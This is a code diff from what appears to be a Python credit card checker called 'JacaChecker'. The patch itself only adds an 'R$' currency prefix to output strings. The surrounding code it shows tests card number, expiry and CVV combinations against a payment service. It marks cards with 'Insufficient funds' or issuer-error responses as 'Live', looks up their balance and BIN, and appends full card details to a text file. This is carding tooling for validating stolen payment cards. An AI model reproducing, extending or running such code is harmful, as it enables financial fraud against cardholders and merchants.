@@ -319,7 +319,7 @@ def checker(card, month, year, cvv):
         elif 'Insufficient funds' in response.text:
             brl = saldo(card, month, year, cvv)
             bin = api_bin(card[:6])              
-            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF [ Saldo: {brl} ]"                          
+            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF [ Saldo: R${brl} ]"                          
             open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF [{MSegundos}] #JacaChecker\n") 
             print(Fore.GREEN + f"{x} #JacaChecker") 
             return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
@@ -327,7 +327,7 @@ def checker(card, month, year, cvv):
         elif 'Unidentifiable error issuer generated' in response.text:
             brl = saldo(card, month, year, cvv)
             bin = api_bin(card[:6])              
-            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19 [ Saldo: {brl} ]"                          
+            x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19 [ Saldo: R${brl} ]"                          
             open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
             print(Fore.GREEN + f"{x} #JacaChecker") 
             return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
